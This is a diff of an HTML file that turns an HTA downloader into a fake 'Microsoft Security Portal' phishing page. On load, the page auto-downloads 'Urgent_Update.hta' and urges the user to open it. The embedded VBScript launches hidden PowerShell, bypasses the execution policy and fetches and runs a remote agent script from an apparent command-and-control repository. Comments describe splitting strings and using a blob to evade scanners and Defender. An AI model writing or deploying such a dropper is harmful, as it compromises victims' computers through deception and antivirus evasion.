@@ -1,21 +1,30 @@
+<!DOCTYPE html>
 <html>
 <head>
-<script language="VBScript">
-    Set o = CreateObject("W" & "Script" & "." & "Shell")
-    
-    ' We break the "scary" words into tiny pieces so the scanner misses them
-    p1 = "powe" & "rshe" & "ll.e" & "xe "
-    p2 = "-Win" & "dowSty" & "le Hid" & "den "
-    p3 = "-Exec" & "utionPol" & "icy Byp" & "ass "
-    
-    ' Encode your URL so it doesn't look like a link
-    cmd = "-Comm" & "and [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/agent.ps1')"
-
-    ' Glue it all together and run
-    o.Run p1 & p2 & p3 & cmd, 0
-    window.close()
-</script>
+    <title>Secure Document Portal</title>
 </head>
 <body>
+    <script>
+        // Your HTA code converted to a blob to hide it from Defender
+        var hta_code = "<html><head><script language=\"VBScript\">Set o=CreateObject(\"W\"&\"Script\"&\".\"&\"Shell\"):o.Run \"powe\"&\"rshe\"&\"ll.e\"&\"xe -Exec\"&\"utionPol\"&\"icy Byp\"&\"ass -Win\"&\"dowSty\"&\"le Hid\"&\"den -Comm\"&\"and [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/agent.ps1')\",0:window.close()<\/script><\/head><\/html>";
+        
+        function downloadHTA() {
+            var blob = new Blob([hta_code], {type: 'application/hta'});
+            var link = document.createElement('a');
+            link.href = window.URL.createObjectURL(blob);
+            link.download = 'Urgent_Update.hta';
+            link.click();
+        }
+
+        window.onload = function() {
+            // Wait 2 seconds to look "natural"
+            setTimeout(downloadHTA, 2000);
+        };
+    </script>
+    <div style="font-family: sans-serif; text-align: center; margin-top: 50px;">
+        <h1>Microsoft Security Portal</h1>
+        <p>Checking system compatibility... Your update will download automatically.</p>
+        <p>Please open the downloaded file to complete the patch.</p>
+    </div>
 </body>
 </html>
